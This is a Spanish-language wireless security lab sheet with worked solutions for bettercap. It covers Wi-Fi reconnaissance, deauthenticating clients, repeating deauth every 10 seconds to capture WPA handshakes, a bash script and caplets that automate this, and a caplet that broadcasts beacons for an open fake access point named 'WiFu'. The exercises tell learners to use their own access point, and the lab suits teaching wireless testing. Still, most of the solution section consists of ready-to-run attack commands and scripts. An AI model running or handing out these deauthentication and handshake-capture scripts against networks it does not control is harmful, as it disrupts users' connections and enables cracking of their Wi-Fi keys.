# Ejercicios

### A

1. Instale e inicie bettercap. Ejecute los comandos "help" y "clear". Una vez completado, cierre bettercap.

### B

1. Utilice el **módulo wifi.recon** bettercap para detectar puntos de acceso cercanos. 
2. Reconfigure el módulo de reconocimiento para que solo escanee los canales 1, 2 y 3. 
> Si no detecta nada, configure su punto de acceso para que transmita en uno de esos canales y vuelva a escanear.

### C

1. Conecte dos clientes a su punto de acceso y desautentique ambos proporcionando el BSSID. Una vez completado el proceso, intente desautenticar solo un cliente, pero esta vez utilice un ticker para ejecutar la desautenticación cada 10 segundos y así garantizar que se capture el protocolo de enlace.

### D

1. Recrea el script de desautenticación localmente y ejecútalo contra un cliente y un punto de acceso que controles.
2. En el script de desautenticación, cambia la ubicación de la captura de paquetes del protocolo de enlace a una ubicación diferente a tu elección.

3. Crea un caplet para inyectar balizas en el canal 3 con el SSID "WiFu" y sin cifrado. 
>La documentación de bettercap te será útil durante este ejercicio. Dado que bettercap no proporciona un servidor DHCP, los clientes podrían conectarse y desconectarse poco después al no recibir una dirección IP.

### E 
Usa la interfaz web para descubrir los puntos de acceso a tu alrededor. Una vez descubiertos, usa la interfaz web para hacer lo siguiente:

1. Cambie la ruta donde se almacenan los archivos del protocolo de enlace (handshake).
2. Desautenticar un cliente.
3. Capture un handshake WPA.

## Insturcciones y Soluciones

### A — Instalar, iniciar, help, clear, salir

1. Instalar (Kali / Debian / Ubuntu):
```bash
sudo apt update
sudo apt install bettercap
```
2. Iniciar bettercap (modo interactivo):

```bash
sudo bettercap -iface wlan0
```
3. Dentro de la sesión interactiva:
Escribir:

```bash
help
```
* Luego:

```bash
clear
```
* Salir de bettercap:
```bash
exit
```

### B — Usar wifi.recon y limitar a canales 1,2,3

1. Entrar a bettercap (ejemplo no interactivo con -eval):

```bash
sudo bettercap -iface wlan0 -eval "wifi.recon on"
```

2. Configurar para que solo escanee canales 1,2,3 (desde la sesión interactiva o -eval):

```bash
wifi.recon.channel 1,2,3
wifi.recon on
```
* Con `-eval`:
```bash
sudo bettercap -iface wlan0 -eval "wifi.recon.channel 1,2,3; wifi.recon on"
```
3. Ver APs detectados:

```bash
wifi.show
```

### C — Desautenticar dos clientes y luego usar ticker para desauth cada 10s a un cliente

1. Desautenticar todos los clientes de un BSSID (ej. DE:AD:BE:EF:DE:AD):
Dentro de bettercap:

```bash
wifi.deauth <AP-BSSID>
```
> Eso desconecta todos los clientes asociados a ese BSSID. 
bettercap

2. Desautenticar un cliente específico (darle BSSID de cliente o usar all/*):

* Para desauth solo un STA (cliente) usar:

```bash
wifi.deauth <client-MAC>
```
(si le pasamos la MAC del cliente - bettercap acepta tanto BSSID como estaciones). Si quieres usar BSSID y filtrar clientes: primero identificar el cliente con wifi.show y luego pasar su MAC a wifi.deauth. 

3. Usar ticker para repetir la desautenticación cada 10 s (capturar el enlace):
Ejemplo (en sesión interactiva):

```bash
set ticker.period 10
set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD 11:22:33:44:55:66"
ticker on
```
— alternativa si quieres deauth por BSSID (todos los clientes) cada 10s:

```bash
set ticker.period 10
set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"
ticker on
```

El ticker ejecuta el/los comando(s) periódicamente (útil para garantizar que quede registrado el EAPOL/handshake en el momento de reintento). Ejemplo similar aparece en la documentación. 
bettercap

4. Parar ticker:

```bash
ticker off
```

### D — Script local de desautenticación y cambio de ruta de captura de handshakes; caplet para beacon (canal 3, SSID "WiFu", sin cifrado)
#### D.1 Script bash que crea un caplet y lo ejecuta (recomendado)

Ejemplo con un caplet temporal y luego cómo ejecutarlo. Esto facilita repetir la prueba.

Crear deauth.cap con este contenido (ejemplo: desauth a cliente 11:22:33:44:55:66 en AP DE:AD:BE:EF:DE:AD, guarda handshakes en /tmp/handshakes/mi_handshake.pcap):

```bash
# deauth.cap
set wifi.interface wlan0
# detener recon si está corriendo y luego configurar archivo de handshakes
wifi.recon off
set wifi.handshakes.file /tmp/handshakes/mi_handshake.pcap
# opcional: crear carpeta
!mkdir -p /tmp/handshakes
# Habilitar recon (con channel hopping por defecto)
wifi.recon on
# Ejecutar desauth al AP y al cliente
wifi.deauth DE:AD:BE:EF:DE:AD 11:22:33:44:55:66
# esperar 15s para capturar
sleep 15
# detener recon
wifi.recon off
```
Ejecutar el caplet:

```bash
sudo bettercap -caplet ./deauth.cap
```

**Notas importantes:**

Si cambiamos wifi.handshakes.file mientras wifi.recon está ON, el cambio puede no aplicarse hasta reiniciar wifi.recon (parar y volver a arrancar). (Ojo con esto al mover la ruta). 

#### D.2 Script bash simple que usa -eval y ticker (ejemplo run_deauth.sh)

```bash
#!/bin/bash
AP="DE:AD:BE:EF:DE:AD"
STA="11:22:33:44:55:66"
HAND="/tmp/handshakes/mi_handshake.pcap"

mkdir -p "$(dirname "$HAND")"

sudo bettercap -iface wlan0 -eval "wifi.recon off; set wifi.handshakes.file $HAND; wifi.recon on; set ticker.period 10; set ticker.commands \"wifi.deauth $AP $STA\"; ticker on"
```
Lo hacemos ejecutable: `chmod +x run_deauth.sh` y ejecutamos. Esto va a repetir la desauth cada 10 s hasta que detengamos bettercap o frenemos el ticker `ticker off`.

#### D.3 Caplet para inyectar beacons (fake AP) en canal 3, SSID WiFu, sin cifrado

Crear beacon_wifi.cap:

```bash
# beacon_wifi.cap
set wifi.interface wlan0
set wifi.ap.ssid WiFu
set wifi.ap.bssid DE:AD:BE:EF:00:01
set wifi.ap.channel 3
set wifi.ap.encryption false
wifi.recon on
wifi.ap
# dejarlo corriendo (ctrl+c en bettercap para parar)
```

Ejecutar:

```bash
sudo bettercap -caplet ./beacon_wifi.cap
```

> Advertencia: bettercap solo envía beacons; no hace DHCP ni da IPs — clientes que se asocien sin DHCP tenderán a desconectarse después porque no reciben IP. Si queremos un AP funcional—usar hostapd + dnsmasq/dhcpd.

### E — Interfaz web: descubrir APs, cambiar ruta handshakes, desautenticar y capturar handshake desde UI

1. Arrancar la UI (desde terminal):

```bash
sudo bettercap -eval "ui on; set wifi.interface wlan0; wifi.recon on"
```
La UI por defecto queda disponible en http://127.0.0.1:8081 o en la IP del equipo (la doc indica ui on para activarla). Usuario/Pass por defecto: user / pass. Si no aparece UI, revisa logs/puerto y que tu navegador pueda acceder. 
bettercap
+1

2. Descubrir APs via UI:

En la pestaña WiFi / Recon, activa wifi.recon. La UI listará APs detectados (igual que wifi.show en CLI).

3. Cambiar la ruta donde se guardan los handshakes (desde UI):

* En Advanced / Settings (o en la sección de WiFi) busca wifi.handshakes.file y edítalo al path que quieras (ej: /home/user/handshakes/mi.pcap).

> IMPORTANTE: si wifi.recon está ON, cambia el archivo detén wifi.recon, cambia wifi.handshakes.file, y vuelve a arrancar wifi.recon para que el cambio aplique (comportamiento documentado). 
bettercap
+1

4. Desautenticar un cliente desde la UI:

* Selecciona el AP y sus clientes en la lista; habrá botones/acciones para deauth o kick (la UI ejecuta wifi.deauth con el objetivo seleccionado). Si no hay botón, usa la consola integrada para enviar wifi.deauth <BSSID> <STA>.

5. Capturar handshake WPA:

* Con wifi.recon on y con desauths (manuales o por ticker), la captura intentará guardar handshakes en la ruta configurada. Observa en la UI el apartado de handshakes/PMKID donde se notifican capturas. Si no aparece el handshake, repite la desauth (o usa ticker para repetir cada 5–10s) hasta que aparezca la captura. 
bettercap
